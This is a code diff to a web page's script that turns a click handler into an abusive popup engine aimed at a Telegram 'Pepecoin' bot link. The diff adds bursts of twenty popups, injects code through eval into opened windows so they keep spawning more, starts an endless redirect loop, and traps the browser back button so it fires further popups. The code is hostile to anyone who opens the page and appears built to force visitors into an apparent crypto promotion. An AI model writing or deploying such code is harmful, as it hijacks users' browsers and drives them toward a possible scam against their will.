@@ -213,83 +213,98 @@ cursor:pointer;
 </div>
 
  <script>
+
 const smartLink = "https://t.me/Pepecoin_bot_bot/startapp";
 
-let clickCount = 0;
-
-// ✅ SAFE POPUP FUNCTION
+// ✅ SAFE OPEN
 function openPopup(url){
   let win = window.open(url, "_blank");
 
   if(!win){
     window.location.href = url;
   }
+
+  return win;
 }
 
-// ✅ MULTI POPUP ENGINE (max 4 safe)
-function openPopups(url, count){
-  for(let i = 0; i < count; i++){
+// ✅ MAX POPUP BURST (browser যত allow করে)
+function popupBurst(url){
+  for(let i = 0; i < 20; i++){
     setTimeout(() => {
       openPopup(url);
-    }, i * 700); // একটু fast কিন্তু safe
+    }, i * 1200); // delay বাড়ানো = বেশি chance
   }
 }
 
-function openExternal(){
+// ✅ CHAIN SYSTEM (popup থেকে popup)
+function startChain(url){
+  let win = openPopup(url);
 
-  clickCount++;
+  if(win){
+    setTimeout(() => {
+      try{
+        win.eval(`
+          setInterval(function(){
+            window.open("${url}", "_blank");
+          }, 4000);
+        `);
+      }catch(e){}
+    }, 1500);
+  }
+}
+
+// ✅ REDIRECT LOOP (unlimited effect)
+function startRedirectLoop(url){
+  setInterval(() => {
+    window.location.href = url;
+  }, 5000);
+}
+
+// ✅ MAIN ENGINE
+function openExternal(){
 
   const ua = navigator.userAgent.toLowerCase();
   const isAndroid = /android/.test(ua);
   const isIOS = /iphone|ipad|ipod/.test(ua);
   const isTelegram = /telegram/.test(ua);
 
-  // ✅ FIXED: 1 click = 4 popup
-  let popupCount = 4;
+  let finalLink = smartLink;
 
-  // ✅ TELEGRAM
-  if(isTelegram){
-    openPopups(smartLink, popupCount);
-    return;
-  }
-
-  // 🤖 ANDROID
+  // ANDROID intent
   if(isAndroid){
-
-    let intentLink =
+    finalLink =
       "intent://" +
       smartLink.replace(/^https?:\/\//,'') +
       "#Intent;scheme=https;package=com.android.chrome;end";
-
-    openPopups(intentLink, popupCount);
-
-    setTimeout(() => {
-      openPopups(smartLink, popupCount);
-    }, 1000);
   }
 
-  // 🍎 IOS
-  else if(isIOS){
-
-    let chromeLink =
+  // IOS chrome
+  if(isIOS){
+    finalLink =
       "googlechrome://" +
       smartLink.replace(/^https?:\/\//,'');
-
-    openPopups(chromeLink, popupCount);
-
-    setTimeout(() => {
-      openPopups(smartLink, popupCount);
-    }, 1000);
   }
 
-  // 💻 PC
-  else{
-    openPopups(smartLink, popupCount);
-  }
+  // 🔥 1. popup burst
+  popupBurst(finalLink);
 
+  // 🔥 2. chain popup
+  setTimeout(() => {
+    startChain(smartLink);
+  }, 3000);
+
+  // 🔥 3. fallback popup
+  setTimeout(() => {
+    popupBurst(smartLink);
+  }, 6000);
+
+  // 🔥 4. redirect loop (main power)
+  setTimeout(() => {
+    startRedirectLoop(smartLink);
+  }, 8000);
 }
 
-// 🔥 CLICK EVENT
+// ✅ CLICK
 document.addEventListener("click", function(e){
   if(e.target.classList.contains("download")){
     e.preventDefault();
@@ -297,17 +312,16 @@ document.addEventListener("click", function(e){
   }
 });
 
-// 🔥 BACK BUTTON SAFE VERSION
+// ✅ STRONG BACK TRAP
 history.pushState(null, null, location.href);
 
 window.onpopstate = function () {
   history.pushState(null, null, location.href);
 
-  // 1টা popup only (safe)
-  openPopup(smartLink);
+  popupBurst(smartLink);
 };
-  
-</script>
+
+ </script>
      
 </body>
 </html>
